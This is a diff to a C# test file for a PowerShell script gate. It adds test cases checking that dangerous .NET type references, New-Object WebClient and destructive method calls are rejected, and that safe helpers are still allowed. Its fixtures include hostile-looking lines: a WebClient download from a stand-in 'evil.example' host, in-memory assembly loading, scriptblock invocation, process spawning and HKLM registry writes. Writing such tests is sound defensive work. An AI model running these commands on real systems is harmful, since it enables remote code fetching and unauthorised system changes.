@@ -113,6 +113,73 @@ public sealed class AdhocScriptGateTests
         result.Violations.Should().Contain(v => v.Kind == AdhocViolationKind.ParseError);
     }
 
+    // ── Dangerous .NET type references (closes documented gate gap #1) ────────
+
+    [Theory]
+    [InlineData("[System.IO.File]::Delete($p)")]
+    [InlineData("[IO.File]::WriteAllText('out.txt', $data)")]
+    [InlineData("[System.Net.WebClient]::new().DownloadString('http://evil.example')")]
+    [InlineData("[System.Reflection.Assembly]::Load($bytes)")]
+    [InlineData("[System.Diagnostics.Process]::Start('calc.exe')")]
+    [InlineData("[scriptblock]::Create($code).Invoke()")]
+    [InlineData("([wmiclass]'Win32_Process').Create('calc.exe')")]
+    [InlineData("[Microsoft.Win32.Registry]::SetValue('HKEY_LOCAL_MACHINE\\X', 'Y', 1)")]
+    public void Dangerous_dotnet_type_reference_is_rejected_in_both_modes(string script)
+    {
+        // These are member-expressions over a type literal/cast, not CommandAst —
+        // the command allowlist never sees them. The type-reference walk must.
+        foreach (var mode in new[] { AdhocMode.Readonly, AdhocMode.Mutating })
+        {
+            var result = AdhocScriptGate.Analyze(script, mode);
+            result.IsAllowed.Should().BeFalse($"[{mode}] {script}");
+            result.Violations.Should().Contain(
+                v => v.Kind == AdhocViolationKind.DangerousTypeReference,
+                $"[{mode}] {result.Summary}");
+        }
+    }
+
+    [Theory]
+    [InlineData("New-Object System.Net.WebClient")]
+    [InlineData("New-Object -TypeName System.IO.StreamWriter -ArgumentList 'out.txt'")]
+    [InlineData("$w = New-Object Net.WebClient; $w.DownloadString('http://x')")]
+    public void New_Object_with_dangerous_type_is_rejected_in_mutating_mode(string script)
+    {
+        var result = AdhocScriptGate.Analyze(script, AdhocMode.Mutating);
+
+        result.IsAllowed.Should().BeFalse();
+        result.Violations.Should().Contain(
+            v => v.Kind == AdhocViolationKind.DangerousTypeReference, result.Summary);
+    }
+
+    [Theory]
+    [InlineData("(Get-Process -Name foo)[0].Kill()")]
+    [InlineData("$file.Delete()")]
+    [InlineData("(Get-Process)[0].Terminate()")]
+    public void Readonly_rejects_destructive_instance_method_calls(string script)
+    {
+        // The receiver's static type can't be resolved, so the gate matches the
+        // unambiguously-destructive verb itself — a readonly session can't kill,
+        // delete, or terminate even via a method call on a Get-* result.
+        var result = AdhocScriptGate.Analyze(script, AdhocMode.Readonly);
+
+        result.IsAllowed.Should().BeFalse();
+        result.Violations.Should().Contain(
+            v => v.Kind == AdhocViolationKind.ModeEscalation, result.Summary);
+    }
+
+    [Theory]
+    [InlineData("Get-Date | ForEach-Object { [Math]::Round($_.Hour, 0) }")]
+    [InlineData("Get-Process | ForEach-Object { [string]::Format('{0}', $_.Name) }")]
+    [InlineData("[System.Environment]::MachineName")]
+    [InlineData("Get-ChildItem | ForEach-Object { [System.IO.Path]::GetFileName($_.FullName) }")]
+    public void Safe_dotnet_types_remain_allowed_in_readonly(string script)
+    {
+        // Regression guard: the blocklist must not over-block the read-only
+        // formatting/maths helpers ad-hoc diagnostics legitimately need.
+        var result = AdhocScriptGate.Analyze(script, AdhocMode.Readonly);
+        result.IsAllowed.Should().BeTrue(result.Summary);
+    }
+
     // ── Property-based (M11.E.17) ────────────────────────────────────────────
 
     /// <summary>
@@ -133,6 +200,9 @@ public sealed class AdhocScriptGateTests
         "New-ItemProperty -Path HKCU:\\Software\\Kraken -Name K -Value 1",
         "Add-Type -TypeDefinition 'public class P {}'",
         "New-Item -Path HKLM:\\Software\\Kraken",
+        "[System.Net.WebClient]::new().DownloadString('http://evil.example')",
+        "[System.IO.File]::WriteAllText('c:\\x.txt', $d)",
+        "New-Object System.Net.WebClient",
     ];
 
     private static readonly string[] BenignLines =
